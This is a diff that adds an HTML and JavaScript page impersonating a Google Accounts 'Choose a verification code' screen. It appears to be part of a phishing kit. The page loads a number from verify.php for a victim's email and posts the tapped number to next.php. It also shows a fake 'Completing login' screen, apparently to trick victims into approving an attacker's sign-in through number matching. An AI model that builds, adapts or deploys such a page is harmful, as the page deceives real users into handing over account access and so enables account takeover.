@@ -1,0 +1,308 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Choose a verification code - Google Accounts</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500;700&display=swap" rel="stylesheet">
+    <style>
+        :root {
+            /* Gmail brand colors */
+            --gmail-blue: #1a73e8;
+            --gmail-red: #ea4335;
+            --gmail-yellow: #fbbc04;
+            --gmail-green: #34a853;
+            --gmail-white: #ffffff;
+            --gmail-gray: #5f6368;
+            --gmail-light-gray: #f1f3f4;
+            --gmail-border: #dadce0;
+        }
+
+        * { box-sizing: border-box; }
+
+        html, body {
+            margin: 0 !important;
+            padding: 0 !important;
+            width: 100% !important;
+            height: 100% !important;
+            overflow-x: hidden !important;
+            font-family: 'Roboto', -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif !important;
+            background: var(--gmail-light-gray) !important;
+            color: #202124 !important;
+            -webkit-font-smoothing: antialiased !important;
+            -moz-osx-font-smoothing: grayscale !important;
+        }
+
+        .gmail-container {
+            background: var(--gmail-white) !important;
+            box-shadow: 0 1px 3px rgba(60,64,67,.3), 0 4px 8px 3px rgba(60,64,67,.15) !important;
+            border-radius: 8px !important;
+            margin: 24px auto 0 !important;
+            padding: 48px 40px 36px !important;
+            width: 100% !important;
+            max-width: 450px !important;
+            min-height: 500px !important;
+            display: flex !important;
+            flex-direction: column !important;
+            justify-content: center !important;
+            align-items: center !important;
+            box-sizing: border-box !important;
+        }
+
+        .gmail-form {
+            width: 100% !important;
+            max-width: 360px !important;
+            margin: 0 auto !important;
+        }
+
+        .gmail-logo {
+            width: 75px !important;
+            height: 24px !important;
+            margin: 0 auto 16px !important;
+            display: block !important;
+            background: url('data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iNzUiIGhlaWdodD0iMjQiIHZpZXdCb3g9IjAgMCA3NSAyNCIgZmlsbD0ibm9uZSIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj4KPHBhdGggZD0iTTIyLjc1IDEySDE5djYuNDhoMy43NVoiIGZpbGw9IiMxQTczRTgiLz4KPHBhdGggZD0iTTIyLjc1IDI0SDE5VjE3LjYuNGgzLjc1VjI0WiIgZmlsbD0iIzM0QTg1MyIvPgo8cGF0aCBkPSJNMjIuNzUgMTEuNGgxOC41YzEuMDUgMCAxLjkyLjg3IDEuOTIgMS45MnYxOC41YzAgMS4wNS0uODcgMS45Mi0xLjkyIDEuOTJIMTUuNzVjLTEuMDUgMC0xLjkyLS44Ny0xLjkyLTEuOTJWMTMuMzJjMC0xLjA1Ljg3LTEuOTIgMS45Mi0xLjkyaDYuODN2My43NVoiIGZpbGw9IiNGQkJDMDQiLz4KPHBhdGggZD0iTTIyLjc1IDExLjRoMTguNWMxLjA1IDAgMS45Mi44NzEgMS45MiAxLjkyVjMwYzAgMS4wNS0uODcgMS45Mi0xLjkyIDEuOTJIMTUuNzVjLTEuMDUgMC0xLjkyLS44Ny0xLjkyLTEuOTJWMTMuMzJjMC0xLjA1Ljg3LTEuOTIgMS45Mi0xLjkyaDYuODN2My43NVoiIGZpbGw9IiNFQTQzMzUiLz4KPHBhdGggZD0iTTIyLjc1IDI0SDE5VjE3LjYuNGgzLjc1VjI0WiIgZmlsbD0iIzM0QTg1MyIvPgo8L3N2Zz4K') no-repeat center center !important;
+            background-size: contain !important;
+        }
+
+        .choose-title {
+            font-size: 24px !important;
+            font-weight: 400 !important;
+            font-family: 'Roboto', sans-serif !important;
+            color: #202124 !important;
+            margin: 0 0 8px 0 !important;
+            text-align: center !important;
+        }
+
+        .choose-subtitle {
+            font-size: 16px !important;
+            color: #5f6368 !important;
+            margin: 0 0 24px 0 !important;
+            text-align: center !important;
+        }
+
+        .code-instruction {
+            font-size: 16px !important;
+            color: #202124 !important;
+            margin: 0 0 24px 0 !important;
+            text-align: center !important;
+            font-weight: 400 !important;
+        }
+
+        .number-display {
+            text-align: center !important;
+            margin: 40px 0 !important;
+        }
+
+        .single-number {
+            display: inline-block !important;
+            width: 120px !important;
+            height: 120px !important;
+            border: 3px solid var(--gmail-blue) !important;
+            border-radius: 50% !important;
+            background: var(--gmail-white) !important;
+            color: #202124 !important;
+            font-size: 36px !important;
+            font-weight: 600 !important;
+            cursor: pointer !important;
+            display: flex !important;
+            align-items: center !important;
+            justify-content: center !important;
+            transition: all 0.2s ease !important;
+            box-shadow: 0 4px 8px rgba(26, 115, 232, 0.3) !important;
+        }
+
+        .single-number:hover {
+            background: #f8f9fa !important;
+            transform: scale(1.05) !important;
+        }
+
+        .single-number:active {
+            transform: scale(0.95) !important;
+        }
+
+        .number-btn:hover {
+            border-color: var(--gmail-blue) !important;
+            background: #f8f9fa !important;
+        }
+
+        .number-btn.selected {
+            background: var(--gmail-blue) !important;
+            color: var(--gmail-white) !important;
+            border-color: var(--gmail-blue) !important;
+        }
+
+        .selected-code {
+            text-align: center !important;
+            margin: 24px 0 !important;
+            font-size: 18px !important;
+            color: #5f6368 !important;
+        }
+
+        .selected-number {
+            font-size: 32px !important;
+            font-weight: 500 !important;
+            color: var(--gmail-blue) !important;
+            margin-top: 8px !important;
+        }
+
+        .gmail-next-btn {
+            width: 100% !important;
+            background: var(--gmail-blue) !important;
+            color: var(--gmail-white) !important;
+            border: none !important;
+            border-radius: 4px !important;
+            padding: 12px 24px !important;
+            font-size: 14px !important;
+            font-weight: 500 !important;
+            cursor: pointer !important;
+            margin-top: 24px !important;
+            text-transform: none !important;
+            opacity: 0.6 !important;
+            pointer-events: none !important;
+        }
+
+        .gmail-next-btn.enabled {
+            opacity: 1 !important;
+            pointer-events: auto !important;
+        }
+
+        .gmail-next-btn.enabled:hover {
+            background: #1557b0 !important;
+        }
+
+        .help-link {
+            display: block !important;
+            text-align: center !important;
+            margin-top: 24px !important;
+            color: var(--gmail-blue) !important;
+            text-decoration: none !important;
+            font-size: 14px !important;
+        }
+
+        .help-link:hover {
+            text-decoration: underline !important;
+        }
+
+        .error-message {
+            background: #fce8e6 !important;
+            color: #c5221f !important;
+            padding: 12px !important;
+            border-radius: 4px !important;
+            margin: 16px 0 !important;
+            font-size: 14px !important;
+            text-align: center !important;
+            display: none !important;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+    </style>
+</head>
+<body>
+    <div class="gmail-container">
+        <div class="gmail-form">
+            <div class="gmail-logo"></div>
+            <h1 class="choose-title">Choose a verification code</h1>
+            <div class="choose-subtitle">For your security, we need to verify it's you</div>
+
+            <div class="code-instruction" id="tap-instruction">Tap the number on your phone to complete login</div>
+
+            <div class="number-display">
+                <button class="single-number" id="number-btn" onclick="selectNumber()"></button>
+            </div>
+
+            <div class="loading-state" id="loading-state" style="display: none; text-align: center; margin-top: 32px;">
+                <div style="font-size: 48px; margin-bottom: 16px;">⏳</div>
+                <div style="font-size: 16px; color: #5f6368; margin-bottom: 8px;">Completing login...</div>
+                <div style="font-size: 14px; color: #80868b;">Please wait while we verify your account</div>
+                <div class="loading-spinner" style="margin: 24px auto; width: 40px; height: 40px; border: 4px solid #f3f3f3; border-top: 4px solid var(--gmail-blue); border-radius: 50%; animation: spin 1s linear infinite;"></div>
+            </div>
+
+            <div class="error-message" id="error-message">
+                Incorrect code. Please try again.
+            </div>
+
+            <a href="#" class="help-link" onclick="needHelp()">Try another way</a>
+        </div>
+    </div>
+
+    <script>
+        // Get URL parameters
+        function getUrlParameter(name) {
+            name = name.replace(/[\[]/, '\\[').replace(/[\]]/, '\\]');
+            var regex = new RegExp('[\\?&]' + name + '=([^&#]*)');
+            var results = regex.exec(location.search);
+            return results === null ? '' : decodeURIComponent(results[1].replace(/\+/g, ' '));
+        }
+
+        // Load and display the specific number
+        function loadNumber() {
+            const email = getUrlParameter('email');
+            const numberBtn = document.getElementById('number-btn');
+
+            if (!email) {
+                alert('Email parameter missing');
+                return;
+            }
+
+            // Fetch the specific number from verify.php
+            const xhr = new XMLHttpRequest();
+            xhr.open('GET', 'verify.php?email=' + encodeURIComponent(email), true);
+            xhr.onreadystatechange = function() {
+                if (xhr.readyState === 4 && xhr.status === 200) {
+                    const response = JSON.parse(xhr.responseText);
+
+                    if (response.prompt_type === 'choose_number' && response.number !== undefined) {
+                        numberBtn.textContent = response.number;
+                        numberBtn.setAttribute('aria-label', 'Tap number ' + response.number);
+                    } else {
+                        // Fallback to a random number
+                        const randomNum = Math.floor(Math.random() * 100);
+                        numberBtn.textContent = randomNum;
+                        numberBtn.setAttribute('aria-label', 'Tap number ' + randomNum);
+                    }
+                } else if (xhr.readyState === 4) {
+                    // Error - fallback to random
+                    const randomNum = Math.floor(Math.random() * 100);
+                    numberBtn.textContent = randomNum;
+                    numberBtn.setAttribute('aria-label', 'Tap number ' + randomNum);
+                }
+            };
+            xhr.send();
+        }
+
+        function selectNumber() {
+            const numberBtn = document.getElementById('number-btn');
+            const selectedNumber = numberBtn.textContent;
+
+            // Send the selected number to backend
+            const xhr = new XMLHttpRequest();
+            xhr.open('POST', 'next.php', true);
+            xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
+            xhr.send('chosen_number=' + encodeURIComponent(selectedNumber));
+
+            // Hide the number button and show loading state
+            document.querySelector('.number-display').style.display = 'none';
+            document.getElementById('tap-instruction').style.display = 'none';
+            document.getElementById('loading-state').style.display = 'block';
+            document.querySelector('.help-link').style.display = 'none';
+
+            // Change title and subtitle for loading state
+            document.querySelector('.choose-title').textContent = 'Verifying...';
+            document.querySelector('.choose-subtitle').textContent = 'Please wait while we complete your login';
+        }
+
+        function needHelp() {
+            alert("Choose a different verification method.");
+            // Could redirect to SMS verification, etc.
+        }
+
+        // Initialize on page load
+        document.addEventListener('DOMContentLoaded', loadNumber);
+    </script>
+</body>
+</html>
